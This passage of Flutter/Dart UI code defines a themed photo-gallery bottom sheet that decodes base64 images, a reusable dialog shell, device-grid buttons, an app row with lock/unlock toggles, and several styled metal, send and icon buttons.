                                ),
                                if ((data['subtitle'] ?? '').isNotEmpty) ...[
                                  const SizedBox(height: 2),
                                  Text(
                                    data['subtitle'] ?? '',
                                    style: TextStyle(
                                      color: C.text.withOpacity(0.5),
                                      fontSize: 9,
                                      fontFamily: 'ShareTechMono',
                                      fontWeight: FontWeight.w500,
                                    ),
                                    maxLines: 2,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                ],
                              ],
                            ),
                          ),
                        ],
                      ),
                    );
                  },
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    final C = AppTheme.current.value;
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => Container(
        height: MediaQuery.of(context).size.height * 0.75,
        decoration: BoxDecoration(
          borderRadius: const BorderRadius.vertical(top: Radius.circular(20)),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [C.bg, C.bgDark, C.bgDeep],
          ),
        ),
        child: SafeArea(
          top: false,
          child: Column(
            children: [
              Container(
                margin: const EdgeInsets.only(top: 10),
                width: 50,
                height: 4,
                decoration: BoxDecoration(
                  color: C.textSub,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(14),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: C.primaryLo,
                        border: Border.all(
                            color: C.primaryHi.withOpacity(0.6), width: 1),
                      ),
                      child: Icon(Icons.photo_library_rounded,
                          color: C.primaryHi, size: 16),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        'GALLERY (${imgs.length})',
                        style: TextStyle(
                          color: C.accent,
                          fontSize: 12,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                    ),
                    _MetalIconButton(
                      C: C,
                      icon: Icons.close_rounded,
                      size: 30,
                      onTap: () => Navigator.pop(context),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: imgs.isEmpty
                    ? Center(
                        child: Text(
                          'NO PHOTOS',
                          style: TextStyle(
                            color: C.accent,
                            fontSize: 10,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w900,
                            letterSpacing: 1.5,
                          ),
                        ),
                      )
                    : GridView.builder(
                        padding: const EdgeInsets.all(10),
                        gridDelegate:
                            const SliverGridDelegateWithFixedCrossAxisCount(
                          crossAxisCount: 3,
                          crossAxisSpacing: 4,
                          mainAxisSpacing: 4,
                        ),
                        itemCount: imgs.length,
                        itemBuilder: (_, i) {
                          try {
                            final raw = imgs[i].toString();
                            final clean = raw.contains(',')
                                ? raw.split(',').last
                                : raw;
                            final bytes = base64Decode(clean);
                            return GestureDetector(
                              onTap: () =>
                                  _imgDialog(raw, 'Photo ${i + 1}'),
                              child: ClipRRect(
                                borderRadius: BorderRadius.circular(6),
                                child: Image.memory(bytes,
                                    fit: BoxFit.cover),
                              ),
                            );
                          } catch (_) {
                            return Container(
                              decoration: BoxDecoration(
                                color: C.bg,
                                borderRadius: BorderRadius.circular(6),
                              ),
                            );
                          }
                        },
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // DIALOG BUILDER (reusable shell)
  // ═══════════════════════════════════════════════════════════
  Widget _buildDialog({
    required IconData icon,
    required Color iconColor,
    required String title,
    required String subtitle,
    required Widget child,
    required List<Widget> actions,
  }) {
    final C = AppTheme.current.value;
    return Dialog(
      backgroundColor: Colors.transparent,
      insetPadding: const EdgeInsets.symmetric(horizontal: 20),
      child: _SoftPanel(
        C: C,
        padding: const EdgeInsets.all(18),
        accent: iconColor.withOpacity(0.6),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: iconColor.withOpacity(0.15),
                    border: Border.all(
                        color: iconColor.withOpacity(0.6), width: 1.2),
                    boxShadow: [
                      BoxShadow(
                        color: iconColor.withOpacity(0.3),
                        blurRadius: 10,
                        spreadRadius: 0,
                      ),
                    ],
                  ),
                  child: Icon(icon, color: iconColor, size: 18),
                ),
                const SizedBox(width: 12),
                _Screw(C: C, size: 10),
                const SizedBox(width: 8),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        title,
                        style: TextStyle(
                          color: C.accent,
                          fontSize: 12,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'Orbitron',
                          letterSpacing: 1.5,
                          shadows: const [
                            Shadow(
                              color: Colors.black,
                              offset: Offset(0, 1),
                              blurRadius: 2,
                            ),
                          ],
                        ),
                      ),
                      if (subtitle.isNotEmpty) ...[
                        const SizedBox(height: 2),
                        Text(
                          subtitle,
                          style: TextStyle(
                            color: C.text.withOpacity(0.6),
                            fontSize: 9,
                            fontFamily: 'ShareTechMono',
                            fontWeight: FontWeight.w700,
                          ),
                        ),
                      ],
                    ],
                  ),
                ),
                _Screw(C: C, size: 10),
              ],
            ),
            if (child is! SizedBox) ...[
              const SizedBox(height: 16),
              child,
            ],
            const SizedBox(height: 18),
            Row(
              children: actions
                  .map((a) => Expanded(child: a))
                  .expand((w) => [w, const SizedBox(width: 10)])
                  .toList()
                ..removeLast(),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// DEVICE BUTTON (Grid button)
// ═══════════════════════════════════════════════════════════
class _DeviceButton extends StatefulWidget {
  final AppPalette C;
  final String label;
  final IconData icon;
  final Color color;
  final VoidCallback onTap;
  const _DeviceButton({
    required this.C,
    required this.label,
    required this.icon,
    required this.color,
    required this.onTap,
  });

  @override
  State<_DeviceButton> createState() => _DeviceButtonState();
}

class _DeviceButtonState extends State<_DeviceButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final C = widget.C;
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        HapticFeedback.lightImpact();
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        width: (MediaQuery.of(context).size.width - 40) / 2 - 5,
        height: 78,
        transform: Matrix4.translationValues(
          _pressed ? 2 : 0,
          _pressed ? 2 : 0,
          0,
        ),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(10),
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: _pressed
                ? [C.bgDark, C.bg]
                : [C.bg, C.bgDark],
          ),
          border: Border.all(
            color: widget.color.withOpacity(_pressed ? 0.9 : 0.4),
            width: 1.2,
          ),
          boxShadow: _pressed
              ? []
              : [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.5),
                    offset: const Offset(0, 3),
                    blurRadius: 5,
                  ),
                  BoxShadow(
                    color: widget.color.withOpacity(0.15),
                    blurRadius: 8,
                    spreadRadius: 0,
                  ),
                ],
        ),
        child: Stack(
          children: [
            Positioned(top: 4, left: 4, child: _Rivet(C: C, size: 4)),
            Positioned(top: 4, right: 4, child: _Rivet(C: C, size: 4)),
            Positioned(bottom: 4, left: 4, child: _Rivet(C: C, size: 4)),
            Positioned(bottom: 4, right: 4, child: _Rivet(C: C, size: 4)),
            Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Container(
                    width: 32,
                    height: 32,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: widget.color.withOpacity(0.15),
                      border: Border.all(
                        color: widget.color.withOpacity(0.6),
                        width: 1.2,
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: widget.color.withOpacity(0.3),
                          blurRadius: 8,
                          spreadRadius: 0,
                        ),
                      ],
                    ),
                    child: Icon(
                      widget.icon,
                      color: widget.color,
                      size: 15,
                    ),
                  ),
                  const SizedBox(height: 6),
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 6),
                    child: Text(
                      widget.label.toUpperCase(),
                      style: TextStyle(
                        color: C.text,
                        fontSize: 8,
                        fontWeight: FontWeight.w900,
                        fontFamily: 'Orbitron',
                        letterSpacing: 0.5,
                        height: 1.2,
                        shadows: const [
                          Shadow(
                            color: Colors.black,
                            offset: Offset(0, 1),
                            blurRadius: 2,
                          ),
                        ],
                      ),
                      textAlign: TextAlign.center,
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// APP ROW
// ═══════════════════════════════════════════════════════════
class _AppRow extends StatelessWidget {
  final AppPalette C;
  final String appName;
  final String package;
  final bool isLocked;
  final VoidCallback onToggle;

  const _AppRow({
    required this.C,
    required this.appName,
    required this.package,
    required this.isLocked,
    required this.onToggle,
  });

  @override
  Widget build(BuildContext context) {
    final accent = isLocked ? C.primaryHi : C.textSub;

    return Container(
      margin: const EdgeInsets.only(bottom: 6),
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(8),
        color: isLocked
            ? C.primaryLo.withOpacity(0.4)
            : Colors.black.withOpacity(0.4),
        border: Border.all(
          color: isLocked
              ? C.primaryHi.withOpacity(0.5)
              : C.bgDark,
          width: 1,
        ),
      ),
      child: Row(
        children: [
          Container(
            width: 32,
            height: 32,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: isLocked
                  ? C.primaryLo
                  : C.bg.withOpacity(0.4),
              border: Border.all(color: accent, width: 1),
            ),
            child: Icon(
              isLocked ? Icons.lock_rounded : Icons.apps_rounded,
              color: isLocked ? C.primaryHi : C.textSub,
              size: 14,
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  appName,
                  style: TextStyle(
                    color: isLocked ? C.primaryHi : C.text,
                    fontSize: 11,
                    fontWeight: FontWeight.w900,
                    fontFamily: 'Orbitron',
                    letterSpacing: 0.3,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
                Text(
                  package,
                  style: TextStyle(
                    color: C.text.withOpacity(0.4),
                    fontSize: 8,
                    fontFamily: 'ShareTechMono',
                    fontWeight: FontWeight.w700,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),
          const SizedBox(width: 8),
          _SmallActionButton(
            C: C,
            label: isLocked ? 'UNLOCK' : 'LOCK',
            color: isLocked ? C.primaryHi : C.primaryHi,
            icon: isLocked
                ? Icons.lock_open_rounded
                : Icons.lock_rounded,
            onTap: onToggle,
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// SMALL ACTION BUTTON
// ═══════════════════════════════════════════════════════════
class _SmallActionButton extends StatefulWidget {
  final AppPalette C;
  final String label;
  final Color color;
  final IconData icon;
  final VoidCallback onTap;
  const _SmallActionButton({
    required this.C,
    required this.label,
    required this.color,
    required this.icon,
    required this.onTap,
  });

  @override
  State<_SmallActionButton> createState() => _SmallActionButtonState();
}

class _SmallActionButtonState extends State<_SmallActionButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
        transform: Matrix4.translationValues(
          _pressed ? 1 : 0,
          _pressed ? 1 : 0,
          0,
        ),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(6),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: _pressed
                ? [
                    widget.color.withOpacity(0.4),
                    widget.color.withOpacity(0.2)
                  ]
                : [
                    widget.color.withOpacity(0.8),
                    widget.color.withOpacity(0.5)
                  ],
          ),
          border: Border.all(
            color: widget.color,
            width: 1.2,
          ),
          boxShadow: _pressed
              ? []
              : [
                  BoxShadow(
                    color: widget.color.withOpacity(0.3),
                    blurRadius: 6,
                    spreadRadius: 0,
                  ),
                ],
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(widget.icon, color: Colors.white, size: 10),
            const SizedBox(width: 4),
            Text(
              widget.label,
              style: const TextStyle(
                color: Colors.white,
                fontSize: 8,
                fontWeight: FontWeight.w900,
                fontFamily: 'Orbitron',
                letterSpacing: 0.8,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// METAL BUTTON
// ═══════════════════════════════════════════════════════════
class _MetalButton extends StatefulWidget {
  final String label;
  final Color color;
  final double height;
  final VoidCallback? onTap;
  final IconData? icon;
  const _MetalButton({
    required this.label,
    required this.color,
    required this.height,
    required this.onTap,
    this.icon,
  });

  @override
  State<_MetalButton> createState() => _MetalButtonState();
}

class _MetalButtonState extends State<_MetalButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final C = AppTheme.current.value;
    final disabled = widget.onTap == null;

    return GestureDetector(
      onTapDown: disabled
          ? null
          : (_) => setState(() => _pressed = true),
      onTapUp: disabled
          ? null
          : (_) {
              setState(() => _pressed = false);
              widget.onTap?.call();
            },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        height: widget.height,
        transform: Matrix4.translationValues(
          _pressed ? 1.5 : 0,
          _pressed ? 1.5 : 0,
          0,
        ),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(8),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: disabled
                ? [C.bg, C.bgDark]
                : [
                    widget.color.withOpacity(0.9),
                    widget.color,
                    widget.color.withOpacity(0.7),
                  ],
          ),
          border: Border.all(
            color: disabled
                ? C.bgDark
                : widget.color.withOpacity(0.9),
            width: 1.5,
          ),
          boxShadow: _pressed || disabled
              ? []
              : [
                  BoxShadow(
                    color: widget.color.withOpacity(0.35),
                    blurRadius: 8,
                    spreadRadius: 0,
                  ),
                  BoxShadow(
                    color: Colors.black.withOpacity(0.5),
                    offset: const Offset(0, 3),
                    blurRadius: 5,
                  ),
                ],
        ),
        child: Stack(
          children: [
            Positioned(top: 3, left: 3, child: _Rivet(C: C, size: 4)),
            Positioned(top: 3, right: 3, child: _Rivet(C: C, size: 4)),
            Positioned(bottom: 3, left: 3, child: _Rivet(C: C, size: 4)),
            Positioned(bottom: 3, right: 3, child: _Rivet(C: C, size: 4)),
            Center(
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  if (widget.icon != null) ...[
                    Icon(widget.icon, color: C.text, size: 14),
                    const SizedBox(width: 6),
                  ],
                  Text(
                    widget.label,
                    style: TextStyle(
                      color: C.text,
                      fontSize: 11,
                      fontWeight: FontWeight.w900,
                      fontFamily: 'Orbitron',
                      letterSpacing: 1.5,
                      shadows: const [
                        Shadow(
                          color: Colors.black54,
                          offset: Offset(0, 1),
                          blurRadius: 2,
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// SEND BUTTON
// ═══════════════════════════════════════════════════════════
class _SendButton extends StatefulWidget {
  final AppPalette C;
  final VoidCallback onTap;
  const _SendButton({required this.C, required this.onTap});

  @override
  State<_SendButton> createState() => _SendButtonState();
}

class _SendButtonState extends State<_SendButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final C = widget.C;
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        width: 42,
        height: 42,
        transform: Matrix4.translationValues(
          _pressed ? 1.5 : 0,
          _pressed ? 1.5 : 0,
          0,
        ),
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [C.accentHi, C.accent, C.primaryLo],
          ),
          border: Border.all(color: C.primaryLo, width: 1.5),
          boxShadow: _pressed
              ? []
              : [
                  BoxShadow(
                    color: C.accentHi.withOpacity(0.5),
                    blurRadius: 10,
                    spreadRadius: 0,
                  ),
                  BoxShadow(
                    color: Colors.black.withOpacity(0.5),
                    offset: const Offset(0, 3),
                    blurRadius: 5,
                  ),
                ],
        ),
        child: const Icon(
          Icons.send_rounded,
          color: Colors.white,
          size: 16,
          shadows: [
            Shadow(
              color: Colors.black54,
              offset: Offset(0, 1),
              blurRadius: 2,
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// METAL ICON BUTTON
// ═══════════════════════════════════════════════════════════
class _MetalIconButton extends StatefulWidget {
  final AppPalette C;
  final IconData icon;
  final VoidCallback onTap;
  final double size;
  const _MetalIconButton({
    required this.C,
    required this.icon,
    required this.onTap,
    this.size = 34,
  });

  @override
  State<_MetalIconButton> createState() => _MetalIconButtonState();
}

class _MetalIconButtonState extends State<_MetalIconButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final C = widget.C;
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        width: widget.size,
        height: widget.size,
        transform: Matrix4.translationValues(
          _pressed ? 1 : 0,
          _pressed ? 1 : 0,
          0,
        ),
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [C.textSub, C.bgDark],
          ),
          border: Border.all(
            color: C.text.withOpacity(0.5),
            width: 1,
          ),
          boxShadow: _pressed
              ? []
              : [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.6),
                    offset: const Offset(0, 2),
                    blurRadius: 3,
                  ),
                ],
        ),
        child: Icon(
          widget.icon,
          color: C.primaryHi,
          size: widget.size * 0.42,
        ),
      ),
    );
  }
}